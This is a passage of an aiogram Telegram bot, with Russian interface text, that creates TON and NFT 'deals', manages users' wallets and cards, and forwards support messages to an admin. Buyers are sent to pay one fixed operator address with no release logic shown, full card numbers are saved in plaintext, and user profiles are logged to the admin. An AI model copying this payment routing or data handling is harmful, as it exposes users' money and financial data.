            no_wallets_keyboard
        )
        return
    
    user_data[user_id] = {"step": "select_wallet", "last_bot_message_id": last_message_id}
    
    with open(user_file_path, "r", encoding="utf-8") as file:
        user_info = json.load(file)
    
    wallets = user_info.get("wallets", {})
    keyboard = []
    for wallet_type, wallet_data in wallets.items():
        if wallet_type == "card":
            button_text = f"💳 Карта: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
        elif wallet_type == "ton":
            button_text = f"👛 TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
        elif wallet_type.startswith("crypto_"):
            crypto_name = wallet_type.replace("crypto_", "").upper()
            button_text = f"₿ {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
        else:
            continue
        
        keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"create_deal_wallet_{wallet_type}")])
    
    keyboard.append([types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")])
    wallet_selection_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)

    await send_or_edit_message( 
        user_id, 
        text="💼 <b>Создание сделки</b>\n\nВыберите реквизиты для получения оплаты:",
        reply_markup=wallet_selection_menu
    )

@dp.callback_query(F.data.startswith("create_deal_wallet_"))
async def select_wallet_for_deal_creation(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    wallet_type = callback.data.replace("create_deal_wallet_", "")
    
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {
        "step": "amount", 
        "selected_wallet": wallet_type,
        "last_bot_message_id": last_message_id
    }
    
    user_file_path = f"users/{user_id}.json"
    wallet_info = ""
    
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            
            wallets = user_info.get("wallets", {})
            if wallet_type in wallets:
                wallet_data = wallets[wallet_type]
                
                if wallet_type == "card":
                    wallet_info = f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>"
                elif wallet_type == "ton":
                    wallet_info = f"👛 <b>TON:</b> <code>{wallet_data['address']}</code>"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    wallet_info = f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address']}</code>"
        except Exception as e:
            print(f"Ошибка при загрузке информации о кошельке: {e}")
    
    await send_or_edit_message(
        user_id,
        f"💼 <b>Создание сделки</b>\n\n"
        f"Выбранные реквизиты: {wallet_info}\n\n"
        f"Введите сумму TON сделки в формате: <code>100.5</code>",
        back_button
    )

@dp.callback_query(F.data.startswith("select_wallet_"))
async def select_wallet_for_payment(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deal_code = callback.data.replace("select_wallet_", "")
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    user_file_path = f"users/{user_id}.json"
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            
            wallets = user_info.get("wallets", {})
            if wallets:
                keyboard = []
                for wallet_type, wallet_data in wallets.items():
                    if wallet_type == "card":
                        button_text = f"💳 Карта: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
                    elif wallet_type == "ton":
                        button_text = f"👛 TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                    elif wallet_type.startswith("crypto_"):
                        crypto_name = wallet_type.replace("crypto_", "").upper()
                        button_text = f"₿ {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                    else:
                        continue
                    
                    keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"use_wallet_{deal_code}_{wallet_type}")])
                
                keyboard.append([types.InlineKeyboardButton(text="🔙 Назад", callback_data=f"back_to_deal_{deal_code}")])
                wallet_selection_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)
                
                await send_or_edit_message(
                    user_id,
                    "💳 <b>Выберите реквизиты для оплаты:</b>\n\n"
                    "Выбранные реквизиты будут использованы для этой сделки.",
                    wallet_selection_menu
                )
            else:
                await send_or_edit_message(
                    user_id,
                    "❌ <b>У вас нет добавленных реквизитов</b>\n\n"
                    "Добавьте реквизиты в разделе 'Управление кошельками'",
                    back_button
                )
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при загрузке реквизитов:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>У вас нет добавленных реквизитов</b>\n\n"
            "Добавьте реквизиты в разделе 'Управление кошельками'",
            back_button
        )

@dp.callback_query(F.data.startswith("use_wallet_"))
async def use_selected_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    data_parts = callback.data.split("_")
    deal_code = data_parts[2]
    wallet_type = data_parts[3]
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    deal_path = f"deals/{deal_code}.json"
    if os.path.exists(deal_path):
        try:
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)
            
            user_file_path = f"users/{user_id}.json"
            if os.path.exists(user_file_path):
                with open(user_file_path, "r", encoding="utf-8") as file:
                    user_info = json.load(file)
                
                wallets = user_info.get("wallets", {})
                if wallet_type in wallets:
                    wallet_data = wallets[wallet_type]
                    
                    deal_data["selected_buyer_wallet"] = {
                        "type": wallet_type,
                        "data": wallet_data
                    }
                    
                    with open(deal_path, "w", encoding="utf-8") as file:
                        json.dump(deal_data, file, ensure_ascii=False, indent=4)
                    
                    wallet_info = ""
                    if wallet_type == "card":
                        wallet_info = f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>"
                    elif wallet_type == "ton":
                        wallet_info = f"👛 <b>TON:</b> <code>{wallet_data['address']}</code>"
                    elif wallet_type.startswith("crypto_"):
                        crypto_name = wallet_type.replace("crypto_", "").upper()
                        wallet_info = f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address']}</code>"
                    
                    await send_or_edit_message(
                        user_id,
                        f"✅ <b>Реквизиты выбраны!</b>\n\n"
                        f"{wallet_info}\n\n"
                        f"Эти реквизиты будут использованы для сделки #{deal_code}",
                        back_button
                    )
                else:
                    await send_or_edit_message(
                        user_id,
                        "❌ <b>Реквизиты не найдены</b>",
                        back_button
                    )
            else:
                await send_or_edit_message(
                    user_id,
                    "❌ <b>Ошибка при загрузке реквизитов</b>",
                    back_button
                )
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при сохранении реквизитов:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Сделка не найдена</b>",
            back_button
        )

@dp.callback_query(F.data.startswith("back_to_deal_"))
async def back_to_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deal_code = callback.data.replace("back_to_deal_", "")
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    deal_path = f"deals/{deal_code}.json"
    if os.path.exists(deal_path):
        try:
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)
            
            seller_id = deal_data["user_id"]
            amount = deal_data["amount"]
            description = deal_data["description"]
            
            ton_amount = round(amount, 2)
            buyer_wallets = {}
            buyer_file_path = f"users/{user_id}.json"
            if os.path.exists(buyer_file_path):
                try:
                    with open(buyer_file_path, "r", encoding="utf-8") as file:
                        buyer_info = json.load(file)
                    buyer_wallets = buyer_info.get("wallets", {})
                except Exception as e:
                    print(f"Ошибка при загрузке кошельков покупателя: {e}")
            
            message_text = (
                f"💳 <b>Информация о сделке #{deal_code}</b>\n\n"
                f"👤 <b>Вы покупатель</b> в сделке.\n"
                f"📌 Продавец: <b>{seller_id}</b>\n"
                f"• Успешные сделки: 0\n\n"
                f"• Вы покупаете: {description}\n\n"
                f"🏦 <b>Адрес для оплаты:</b>\n"
                f"<code>{TON_WALLET_ADDRESS}</code>\n\n"
                f"💰 <b>Сумма к оплате:</b>\n"
                f"💎 {ton_amount} TON\n\n"
                f"📝 <b>Комментарий к платежу:</b> {deal_code}\n\n"
                f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                f"После оплаты ожидайте автоматического подтверждения"
            )
            
            tonkeeper_url = f"ton://transfer/{TON_WALLET_ADDRESS}?amount={int(ton_amount * 1e9)}&text={deal_code}"
            buttons_rows = []
            buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
            
            if buyer_wallets:
                buttons_rows.append([types.InlineKeyboardButton(text="💳 Выбрать реквизиты для оплаты", callback_data=f"select_wallet_{deal_code}")])
            
            buttons_rows.append([types.InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")])
            buttons = types.InlineKeyboardMarkup(inline_keyboard=buttons_rows)
            
            await send_or_edit_message(user_id, message_text, buttons)
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при загрузке сделки:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Сделка не найдена</b>",
            back_button
        )

@dp.callback_query(F.data == "exit_deal")
async def exit_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_welcome_screen(user_id)

@dp.callback_query(F.data == "nft_done")
async def nft_done(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Проверяем, есть ли данные о сделке в user_data
    if "amount" not in user_data.get(user_id, {}):
        await callback.answer("❌ Сначала введите сумму сделки!", show_alert=True)
        return
    
    nft_links = user_data[user_id].get("nft_links", [])
    amount = user_data[user_id].get("amount", 0)
    
    # Проверяем, что сумма больше 0
    if amount <= 0:
        await callback.answer("❌ Сумма сделки должна быть больше 0!", show_alert=True)
        return
    
    # Логируем создание сделки (только если это не админ)
    if user_id != ADMIN_ID:
        await log_to_admin(
            event_type="СОЗДАНИЕ СДЕЛКИ",
            user_data={"from_user": callback.from_user.__dict__},
            additional_info=f"Сумма: {amount} TON, NFT ссылок: {len(nft_links)}" if nft_links else f"Сумма: {amount} TON"
        )
    
    # Создаем описание на основе NFT ссылок
    if nft_links:
        description = f"Продажа {len(nft_links)} NFT"
    else:
        description = "Продажа товара"
    
    random_start = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    user_data[user_id]["link"] = f"https://t.me/{BOT_USERNAME}?start={random_start}"

    selected_wallet_type = user_data[user_id].get("selected_wallet")
    seller_wallets = {}
    
    if selected_wallet_type:
        user_file_path = f"users/{user_id}.json"
        if os.path.exists(user_file_path):
            try:
                with open(user_file_path, "r", encoding="utf-8") as file:
                    user_info = json.load(file)
                all_wallets = user_info.get("wallets", {})
                if selected_wallet_type in all_wallets:
                    seller_wallets[selected_wallet_type] = all_wallets[selected_wallet_type]
            except Exception as e:
                print(f"Ошибка при загрузке кошельков продавца: {e}")

    deal_data = {
        "user_id": user_id,
        "amount": amount,
        "description": description,
        "nft_links": nft_links,
        "link": user_data[user_id]["link"],
        "seller_id": user_id,
        "random_start": random_start,
        "seller_wallets": seller_wallets
    }
    deal_file_path = f"deals/{random_start}.json"
    with open(deal_file_path, "w", encoding="utf-8") as file:
        json.dump(deal_data, file, ensure_ascii=False, indent=4)

    wallets_display = ""
    if seller_wallets:
        wallets_display = "\n\n💳 <b>Кошельки для оплаты:</b>\n"
        for wallet_type, wallet_data in seller_wallets.items():
            # Показываем только TON (по запросу)
            if wallet_type != "ton":
                continue
            if wallet_type == "card":
                wallets_display += f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
            elif wallet_type == "ton":
                wallets_display += f"👛 <b>TON:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
            elif wallet_type.startswith("crypto_"):
                crypto_name = wallet_type.replace("crypto_", "").upper()
                wallets_display += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
    else:
        wallets_display = "\n\n⚠️ <b>Внимание:</b> У вас нет добавленных кошельков для получения оплаты!"
    
    nft_display = ""
    if nft_links:
        nft_display = "\n\n🔗 <b>Ссылки на NFT:</b>\n"
        for i, link in enumerate(nft_links, 1):
            nft_display += f"{i}. {link}\n"

    deal_quote = (
        f"🧾 Сделка: #{random_start}\n"
        "🆔 Покупателя: (ожидается)\n"
        "   · Username: (ожидается)\n"
        f"💸 Сумма: {deal_data['amount']} TON\n"
        f"🎁 Товар: {deal_data['description']}"
    )
    quote_html = html.escape(deal_quote)

    share_text = (
        f"🧾 Сделка: #{random_start}\n"
        f"💸 Сумма: {deal_data['amount']} TON\n"
        f"🎁 Товар: {deal_data['description']}\n\n"
        f"🔗 Ссылка: {deal_data['link']}"
    )
    share_url = "https://t.me/share/url?url=&text=" + urlquote(share_text)

    created_keyboard = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [types.InlineKeyboardButton(text="📤 Поделиться сделкой", url=share_url)],
            [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
        ]
    )

    await send_or_edit_message(
        user_id,
        "✅ <b>Сделка успешно создана!</b>\n\n"
        + quote_html
        + nft_display
        + f"\n🔗 <b>Ссылка для покупателя:</b> {deal_data['link']}"
        + wallets_display,
        created_keyboard
    )

    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

# ========== SUPPORT HANDLERS (как во втором скрипте) ==========
@dp.callback_query(F.data == "support")
async def support_handler(callback: types.CallbackQuery, state: FSMContext):
    user = callback.from_user
    user_id = user.id
    
    # Логируем обращение в поддержку
    await log_to_admin(
        event_type="ОБРАЩЕНИЕ В ПОДДЕРЖКУ",
        user_data={"from_user": user.__dict__},
        additional_info="Пользователь начал диалог с поддержкой"
    )
    
    # Отправляем отдельное сообщение с инструкцией
    support_msg = await callback.message.answer(
        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение для поддержки. Мы ответим вам в ближайшее время.",
        reply_markup=support_keyboard,
        parse_mode="HTML"
    )
    
    # Сохраняем ID сообщения для последующего удаления
    support_messages[user_id] = support_msg.message_id
    
    # Устанавливаем состояние ожидания сообщения
    await state.set_state(SupportStates.waiting_for_support_message)
    await callback.answer()

# Обработка сообщений для поддержки
@dp.message(SupportStates.waiting_for_support_message)
async def process_support_message(message: Message, state: FSMContext):
    user = message.from_user
    user_id = user.id
    
    # Удаляем предыдущее сообщение с инструкцией о поддержке
    if user_id in support_messages:
        try:
            await bot.delete_message(chat_id=user_id, message_id=support_messages[user_id])
            del support_messages[user_id]
        except:
            pass
    
    # Логируем отправку сообщения в поддержку
    await log_to_admin(
        event_type="СООБЩЕНИЕ ДЛЯ ПОДДЕРЖКИ",
        user_data={"from_user": user.__dict__},
        additional_info=f"Сообщение: {message.text}"
    )
    
    # Отправляем пользователю сообщение о получении
    await message.answer(
        "✅ Ваше сообщение отправлено в поддержку.\n\nОжидайте ответа в течение ~5 минут.",
        reply_markup=support_keyboard
    )
    
    # Пересылаем сообщение администратору
    support_message = (
        f"🆘 <b>Сообщение от пользователя:</b>\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"👤 Пользователь: @{user.username or 'нет'}\n"
        f"📝 Текст: {message.text}"
    )
    await bot.send_message(ADMIN_ID, support_message, parse_mode="HTML")
    
    # Сбрасываем состояние
    await state.clear()

# ========== MESSAGE HANDLERS ==========
@dp.message(F.text, lambda message: user_data.get(message.from_user.id, {}).get("step") in ["wallet", "ton_wallet", "card", "crypto_wallet"])
async def handle_wallet(message: types.Message):
    user_id = message.from_user.id
    step = user_data.get(user_id, {}).get("step")
    wallet_type = user_data.get(user_id, {}).get("wallet_type")
    
    user_file = f"users/{user_id}.json"
    os.makedirs("users", exist_ok=True)
    
    user_info = {}
    if os.path.exists(user_file):
        with open(user_file, "r", encoding="utf-8") as file:
            user_info = json.load(file)
    
    if "wallets" not in user_info:
        user_info["wallets"] = {}
    
    if step == "wallet" or step == "ton_wallet":
        wallet_address = message.text.strip()
        if len(wallet_address) >= 34:
            user_info["wallets"]["ton"] = {
                "address": wallet_address,
                "type": "ton"
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(
                user_id,
                "✅ <b>TON кошелек успешно добавлен/изменен!</b>",
                wallet_menu
            )
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат TON кошелька. Пожалуйста, отправьте правильный адрес.</b>",
                back_button
            )
    
    elif step == "card":
        card_number = message.text.strip().replace(" ", "").replace("-", "")
        
        if card_number.isdigit() and 13 <= len(card_number) <= 19:
            user_info["wallets"]["card"] = {
                "number": card_number,
                "type": "card"
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(
                user_id,
                "✅ <b>Банковская карта успешно добавлена/изменена!</b>",
                wallet_menu
            )
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат номера карты. Пожалуйста, отправьте правильный номер карты.</b>",
                back_button
            )
    
    elif step == "crypto_wallet":
        wallet_address = message.text.strip()
        crypto_type = wallet_type.replace("crypto_", "")
        
        if len(wallet_address) >= 26:
            user_info["wallets"][wallet_type] = {
                "address": wallet_address,
                "type": "crypto",
                "crypto_type": crypto_type
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            crypto_names = {
        "ton": "TON"
    }
            
            await send_or_edit_message(
                user_id,
                f"✅ <b>{crypto_names.get(crypto_type, crypto_type.upper())} кошелек успешно добавлен/изменен!</b>",
                wallet_menu
            )
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат адреса кошелька. Пожалуйста, отправьте правильный адрес.</b>",
                back_button
            )

@dp.message()
async def handle_steps(message: types.Message):
    user_id = message.from_user.id
    step = user_data.get(user_id, {}).get("step")

    if step == "amount":
        try:
            amount = float(message.text.strip())
            if amount <= 0:
                await send_or_edit_message(
                    user_id,
                    "❌ Сумма должна быть больше 0. Введите правильную сумму:",
                    back_button
                )
                return
                
            last_message_id = user_data[user_id].get("last_bot_message_id")
            user_data[user_id]["amount"] = amount
            user_data[user_id]["step"] = "nft_links"
            user_data[user_id]["nft_links"] = []
            user_data[user_id]["last_bot_message_id"] = last_message_id

            # Сразу переходим к сбору NFT ссылок
            sent_message = await bot.send_message(
                user_id,
                "🔗 <b>Отправьте ссылки на NFT (если это NFT сделка)</b>\n\n"
                "Отправляйте каждую ссылку отдельным сообщением.\n"
                "Когда все ссылки будут отправлены, нажмите кнопку '✅ Готово'.\n\n"
                "<b>Список отправленных ссылок:</b>\n"
                "Пока нет ссылок",
                reply_markup=nft_ready_keyboard,
                parse_mode="HTML"
            )
            
            user_data[user_id]["nft_message_id"] = sent_message.message_id
            
        except ValueError:
            await send_or_edit_message(
                user_id,
                "❌ Пожалуйста, введите сумму в правильном формате (например, <code>100.5</code>).",
                back_button
            )
    
    elif step == "nft_links":
        text = message.text.strip()
        
        # Проверяем, является ли текст ссылкой
        if re.match(r'^(http|https)://', text):
            # Добавляем ссылку в список
            if "nft_links" not in user_data[user_id]:
                user_data[user_id]["nft_links"] = []
            
            user_data[user_id]["nft_links"].append(text)
            
            # Формируем текст со списком ссылок
            links_text = ""
            for i, link in enumerate(user_data[user_id]["nft_links"], 1):
                links_text += f"{i}. {link}\n"
            
            # Обновляем сообщение
            nft_message_id = user_data[user_id].get("nft_message_id")
            if nft_message_id:
                try:
                    await bot.edit_message_text(
                        chat_id=user_id,
                        message_id=nft_message_id,
                        text=f"🔗 <b>Отправьте ссылки на NFT (если это NFT сделка)</b>\n\n"
                             f"Отправляйте каждую ссылку отдельным сообщением.\n"
                             f"Когда все ссылки будут отправлены, нажмите кнопку '✅ Готово'.\n\n"
                             f"<b>Список отправленных ссылок:</b>\n"
                             f"{links_text}",
                        reply_markup=nft_ready_keyboard,
                        parse_mode="HTML"
                    )
                    
                    # Удаляем сообщение пользователя с ссылкой
                    try:
                        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
                    except Exception as e:
                        print(f"Не удалось удалить сообщение пользователя: {e}")
                        
                except Exception as e:
                    print(f"Ошибка при обновлении сообщения: {e}")
        else:
            # Если не ссылка, отправляем сообщение об ошибке и удаляем его через 3 секунды
            error_msg = await message.answer("❌ Это не похоже на ссылку. Пожалуйста, отправьте корректную ссылку на NFT.")
            await asyncio.sleep(3)
            try:
                await error_msg.delete()
                await bot.delete_message(chat_id=user_id, message_id=message.message_id)
            except Exception as e:
                print(f"Не удалось удалить сообщение об ошибке: {e}")

# ========== MAIN ==========
async def main():
    print("Бот запускается...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
